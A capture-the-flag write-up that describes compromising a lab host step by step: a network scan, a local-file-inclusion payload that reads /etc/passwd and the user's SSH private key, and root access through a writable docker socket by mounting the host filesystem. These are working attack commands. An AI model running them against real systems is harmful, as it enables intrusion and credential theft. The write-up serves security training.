
# CTF Writeup — Docker Socket Privilege Escalation


https://drive.usercontent.google.com/download?id=14NqCiUatD1xexq8pO9NXvTLmmbHl2cCl&export=download&authuser=0

**Target:** `192.168.0.171` | **Network:** `192.168.0.0/24`

---

## Phase 1 — Network Discovery

No target IP given, so scanned the classroom WiFi to find the box:

```bash
# Host discovery
sudo nmap -sn 192.168.0.0/24

# Find hosts with port 80 open
nmap -p 80 192.168.0.1-255 --open
```

Found `192.168.0.171` with port 80 open (Intel Corporate MAC — stood out as non-personal device).

Initial scan showed host blocking pings, used `-Pn` to bypass:

```bash
sudo nmap -Pn -sV -sC -p- --min-rate 5000 192.168.0.171
```

**Results:**

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

---

## Phase 2 — Web Enumeration

Apache default page on `/`. Browsed to `/ctf/` and found:

```
CTF Portal
Hint: use ?page=
```

Classic LFI hint.

---

## Phase 3 — LFI Exploitation

```bash
curl -L "http://192.168.0.171/ctf/?page=../../../../etc/passwd"
```

LFI confirmed — got full `/etc/passwd`. Spotted the only real user:

```
vnx:x:1001:1001:vnx,,,:/home/vnx:/bin/bash
```

---

## Phase 4 — SSH Key Exfiltration

```bash
curl -L "http://192.168.0.171/ctf/?page=../../../../home/vnx/.ssh/id_rsa" > vnx_id_rsa
chmod 600 vnx_id_rsa
ssh -i vnx_id_rsa vnx@192.168.0.171
```

Shell as `vnx` ✅

---

## Phase 5 — Privilege Escalation Enumeration

```bash
find / -perm -4000 2>/dev/null        # SUID binaries
find / -writable -user root 2>/dev/null | grep -v proc | grep -v sys
```

Found `/run/docker.sock` writable — docker socket escape vector.

Confirmed docker binary available:

```bash
which docker
# /usr/bin/docker
```

Checked available images:

```bash
docker -H unix:///run/docker.sock images
# Only a 0B empty image — unusable
```

---

## Phase 6 — Docker Socket Escape

No usable image on target, no internet access. Transferred alpine from Kali:

```bash
# On Kali
docker pull alpine
docker save alpine > /tmp/alpine.tar
scp -i vnx_id_rsa /tmp/alpine.tar vnx@192.168.0.171:/tmp/
```

Loaded on target:

```bash
docker -H unix:///run/docker.sock load -i /tmp/alpine.tar
docker -H unix:///run/docker.sock images
# alpine:latest loaded — 8.45MB
```

Mounted host filesystem and read root flag:

```bash
# List root's home first
docker -H unix:///run/docker.sock run -v /:/host --rm alpine ls /host/root/
# root.txt  snap

# Read the flag
docker -H unix:///run/docker.sock run -v /:/host --rm alpine cat /host/root/root.txt
```

---

## Flag

```
FLAG{docker_socket_is_root}
```

---

## Attack Chain Summary

```
Network Scan → Port 80 Found → /ctf/ LFI → /etc/passwd → 
SSH Private Key → Shell as vnx → Writable docker.sock → 
Alpine Image Transfer → Host Mount → Root Flag
```

---

## Key Lessons

- LFI isn't just for `/etc/passwd` — SSH keys are gold
- Writable `/run/docker.sock` = root, always check it
- No internet on target? Transfer images via SCP from attack box
- `docker run -v /:/host` mounts entire host filesystem as root